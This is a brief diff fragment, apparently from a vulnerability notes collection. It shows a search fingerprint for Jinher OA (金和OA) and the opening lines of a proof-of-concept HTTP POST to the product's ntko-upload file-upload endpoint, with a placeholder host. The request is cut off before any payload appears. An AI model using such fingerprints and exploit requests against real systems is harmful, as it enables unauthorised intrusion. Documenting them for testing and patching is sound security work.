@@ -7,7 +7,7 @@
 app="金和网络-金和OA"
 ```
 
-## poc
+## POC
 ```
 POST /jc6/ntkoUpload/ntko-upload!upload.action HTTP/1.1
 Host: you_ip
